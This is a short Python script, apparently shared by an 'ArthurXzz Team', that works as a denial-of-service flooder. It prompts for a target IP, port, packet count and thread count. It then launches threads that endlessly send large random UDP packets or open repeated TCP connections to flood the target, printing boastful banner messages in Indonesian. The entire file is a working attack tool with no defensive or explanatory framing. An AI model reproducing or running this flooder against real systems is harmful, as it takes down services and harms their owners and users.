#!/usr/bin/env python3
#ArthurXzz Team
#Tools By ArthutXzz
import random
import socket
import threading
import os

os.system("clear")
print("ArthurXzz Team DDOS")
print("AUTO TEMBUS")
ip = str(input(" Ip Target: "))
port = int(input(" Port Target: "))
choice = str(input(" Gas Ddos Ga?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(65534)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | ArthurXzz Mengirim Nuklir Dari Mars!!!|")
    except:
      print("[!] | ArthurXzz Mengirim Nuklir Dari Mars!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +"ArthurXzz Disini!!!")
    except:
      s.close()
      print("[*] Nuklir Habis Bumi Meledak!!!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
